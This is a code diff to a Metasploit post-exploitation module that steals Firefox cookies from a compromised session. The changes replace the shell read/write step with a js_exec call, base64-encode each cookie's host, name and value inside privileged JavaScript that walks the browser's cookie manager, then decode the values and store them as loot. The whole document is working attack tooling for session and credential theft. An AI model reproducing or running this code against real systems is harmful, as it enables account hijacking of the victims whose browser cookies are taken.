@@ -5,11 +5,9 @@
 
 require 'json'
 require 'msf/core'
-require 'msf/core/payload/firefox'
 
 class Metasploit3 < Msf::Post
 
-  include Msf::Payload::Firefox
   include Msf::Exploit::Remote::FirefoxPrivilegeEscalation
 
   def initialize(info={})
@@ -29,12 +27,14 @@ class Metasploit3 < Msf::Post
   end
 
   def run
-    print_status "Running the privileged javascript..."
-    session.shell_write("[JAVASCRIPT]#{js_payload}[/JAVASCRIPT]")
-    results = session.shell_read_until_token("[!JAVASCRIPT]", 0, datastore['TIMEOUT'])
+    results = js_exec(js_payload)
     if results.present?
       begin
         cookies = JSON.parse(results)
+        cookies.each do |entry|
+          entry.keys.each { |k| entry[k] = Rex::Text.decode_base64(entry[k]) }
+        end
+
         file = store_loot("firefox.cookies.json", "text/json", rhost, results)
         print_good("Saved #{cookies.length} cookies to #{file}")
       rescue JSON::ParserError => e
@@ -47,6 +47,7 @@ class Metasploit3 < Msf::Post
     %Q|
       (function(send){
         try {
+          var b64 = Components.utils.import("resource://gre/modules/Services.jsm").btoa;
           var cookieManager = Components.classes["@mozilla.org/cookiemanager;1"]
                         .getService(Components.interfaces.nsICookieManager);
           var cookies = [];
@@ -54,7 +55,7 @@ class Metasploit3 < Msf::Post
           while (iter.hasMoreElements()){
             var cookie = iter.getNext();
             if (cookie instanceof Components.interfaces.nsICookie){
-              cookies.push({host:cookie.host, name:cookie.name, value:cookie.value})
+              cookies.push({host:b64(cookie.host), name:b64(cookie.name), value:b64(cookie.value)})
             }
           }
           send(JSON.stringify(cookies));
